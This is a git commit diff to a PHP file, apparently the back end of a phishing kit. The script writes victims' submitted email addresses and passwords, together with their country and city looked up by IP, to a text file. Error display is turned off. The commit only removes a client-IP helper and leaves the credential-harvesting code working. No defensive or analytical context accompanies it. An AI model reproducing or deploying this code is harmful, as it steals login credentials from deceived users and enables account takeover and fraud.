4cee5a080c629f04ab3801efba62489e28f0fb43
holamundo12345new <104818999+holamundo12345new@users.noreply.github.com>
2022-05-05 15:17:48 -0500

    Update Conection1.php

--- Conection1.php
+++ Conection1.php
@@ -1,23 +1,12 @@
 <?php
 
-function getRealIP()
-{
-    if (!empty($_SERVER['HTTP_CLIENT_IP']))
-        return $_SERVER['HTTP_CLIENT_IP'];
-
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];
-
-    return $_SERVER['REMOTE_ADDR'];
-}
-
 date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
 $userp = $_SERVER['REMOTE_ADDR'];
 
 $cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
-$ip = getRealIP();
+
 	
 	$file = fopen("NEW01.txt", "a");
 	
@@ -25,7 +14,6 @@ fwrite($file,
 "* EMAIL: ".$_POST['email']."
 * PASS: ".$_POST['pass']."
 * PASS1: ".$_POST['pass1']."
-* Ip: $ip";
 * F-H-IP-P-C: 
 ".date('Y-m-d')."
 ".date('H:i:s')."
